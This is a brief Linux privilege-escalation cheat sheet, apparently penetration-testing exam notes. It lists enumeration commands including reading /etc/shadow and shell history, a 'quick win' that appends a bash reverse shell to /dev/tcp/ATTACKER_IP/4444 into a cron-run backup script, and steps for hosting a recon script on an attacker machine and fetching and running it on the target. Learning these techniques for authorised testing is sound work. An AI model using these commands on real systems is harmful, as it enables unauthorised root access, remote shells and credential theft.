# Linux PrivEsc

## Manual Checks:

```
sudo -l
find / -perm -4000 -type f 2>/dev/null
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null
cat /etc/crontab
crontab -l
ls -la /etc/cron*
ps aux
cat /etc/passwd
cat /etc/shadow
cat ~/.bash_history
uname -a 
```
Check to see if you can use dirty cow, gtfo bins, sudo promissions, etc. 

Quick wins with crontab:
```
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /opt/backup.sh
```

## Linux Recon script
This is a bash shell script that does the manual checks for you, not as in-depth, but easier to run. 
```
wget https://raw.githubusercontent.com/HackingHusky/OSCPv.2/privesc linux/linuxOS_recon.sh
```
Or download from this repo and share it like Linpeas
```
python3 -m http.server 8000   # attacker machine
wget http://ATTACKER_IP/linuxOS_recon.sh
chmod +x linuxOS_recon.sh
./linuxOS_recon.sh
```
Or if you want to save the output:
```
./linuxOS_recon.sh | tee recon.txt
```
The scripts will also do the same. You would need to share it. 

## linpeas

```
git clone https://github.com/peass-ng/PEASS-ng/releases/tag/20260306-5620909d
```

## Write up

I got over it more in my blog post here:

https://medium.com/@aaronashley466/oscp-notes-linux-privesc-cheatsheet-a73a48eeed0e
